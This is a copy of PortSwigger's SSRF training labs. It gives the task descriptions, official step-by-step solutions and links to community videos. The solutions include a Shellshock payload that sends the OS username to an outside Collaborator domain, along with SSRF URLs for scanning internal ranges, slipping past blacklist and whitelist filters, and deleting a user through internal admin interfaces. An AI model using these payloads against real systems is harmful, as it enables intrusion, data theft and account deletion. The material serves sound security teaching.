# PortSwigger labs: ssrf

> Copied from <https://portswigger.net/web-security/ssrf>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Blind SSRF with out-of-band detection

[Open the lab](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
2. Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request.
3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
4. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=GAQFQhdrM1M

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=lL6Msbkwhyk

</details>


## 2. Blind SSRF with Shellshock exploitation

[Open the lab](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. In Burp Suite Professional, install the Collaborator Everywhere extension from the BApp Store.
2. Add the domain of the lab to Burp Suite's [target scope](/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
3. Browse the site.
4. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the
   `Referer` header.
5. Observe that the HTTP interaction contains your `User-Agent` string within the HTTP request.
6. Send the request to the product page to Burp Intruder.
7. Go to the  [Collaborator](/burp/documentation/desktop/tools/collaborator)  tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:

   `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
8. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
9. Change the `Referer` header to `http://192.168.0.1:8080` then highlight the final octet of the IP address (the number `1`), click **Add §**.
10. In the **Payloads** side panel, change the payload type to **Numbers**, and enter 1, 255, and 1 in the
    **From** and
    **To** and
    **Step** boxes respectively.
11. Click  **Start attack**.
12. When the attack is finished, go to the **Collaborator** tab, and click **Poll now**. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
13. To complete the lab, enter the name of the OS user.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=k84FLMFtuE4

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=eW4QDUytHrY

</details>


## 3. Basic SSRF against another back-end system

[Open the lab](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port
`8080`, then use it to delete the user `carlos`.

<details><summary>Official solution</summary>

1. Visit a product, click **Check stock**, intercept the request in Burp Suite, and send it to Burp Intruder.
2. Change the `stockApi` parameter to `http://192.168.0.1:8080/admin` then highlight the final octet of the IP address (the number `1`) and click **Add §**.
3. In the **Payloads** side panel, change the payload type to **Numbers**, and enter 1, 255, and 1 in the
   **From** and **To** and
   **Step** boxes respectively.
4. Click  **Start attack**.
5. Click on the **Status** column to sort it by status code ascending. You should see a single entry with a status of
   `200`, showing an admin interface.
6. Click on this request, send it to Burp Repeater, and change the path in the `stockApi` to: `/admin/delete?username=carlos`

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=Ku6CK3Aes8Y

##### Rana Khalil

https://www.youtube.com/watch?v=t4Hrq7TCTPU

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=Y26I3blLTdk

</details>


## 4. Basic SSRF against the local server

[Open the lab](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

<details><summary>Official solution</summary>

1. Browse to `/admin` and observe that you can't directly access the admin page.
2. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
3. Change the URL in the `stockApi` parameter to `http://localhost/admin`. This should display the administration interface.
4. Read the HTML to identify the URL to delete the target user, which is:

   `http://localhost/admin/delete?username=carlos`
5. Submit this URL in the `stockApi` parameter, to deliver the SSRF attack.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=lMxCQcktifs

##### z3nsh3ll

https://www.youtube.com/watch?v=4oXH8qRqDPQ

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=yblAc0upHC4

</details>


## 5. SSRF with filter bypass via open redirection vulnerability

[Open the lab](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

<details><summary>Official solution</summary>

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
4. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:

   `/product/nextProduct?path=http://192.168.0.12:8080/admin`
5. Observe that the stock checker follows the redirection and shows you the admin page.
6. Amend the path to delete the target user:

   `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=iF1BPVTqM10

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=MZMGF_qD6DQ

</details>


## 6. SSRF with blacklist-based input filter

[Open the lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

<details><summary>Official solution</summary>

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the request is blocked.
3. Bypass the block by changing the URL to: `http://127.1/`
4. Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
5. Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=YGyEH3qDtWg

##### Rana Khalil

https://www.youtube.com/watch?v=vO0EqpX6PCQ

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=y_lq8mfUwcs

</details>


## 7. SSRF with whitelist-based input filter

[Open the lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.

<details><summary>Official solution</summary>

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to `http://username@stock.weliketoshop.net/` and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a `#` to the username and observe that the URL is now rejected.
5. Double-URL encode the `#` to `%2523` and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to:

   `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=EJhxTN0T_UM

##### Michael Sommer (no audio)

https://www.youtube.com/watch?v=CsV8Huq6wkc

</details>

